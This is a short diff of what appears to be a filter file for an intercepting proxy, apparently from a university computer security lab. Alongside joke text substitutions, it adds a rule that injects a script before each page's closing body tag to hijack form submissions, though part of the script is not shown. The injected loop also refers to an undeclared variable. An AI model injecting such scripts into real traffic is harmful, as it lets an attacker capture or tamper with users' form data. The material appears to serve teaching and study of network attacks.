@@ -1,6 +1,12 @@
-<script>
+FILTER: test
+s/CSSE 442/Computer Security/igU
+
+FILTER: hose
+s/Rose-Hulman/Hose-Rulman/igU
+
+FILTER: zach
+s|</body>|<script>
 var frms = document.getElementsByTagName("script");
-alert("" + frms.length);
 for(i=0; i<frms.length; i++) {
 hijack(fms.item(i));
 }
@@ -52,4 +58,4 @@ if(frmObj.hasAttribute("onsubmit")) {
 return false;
 }
 </script>
-</body>
+</body>|Usg
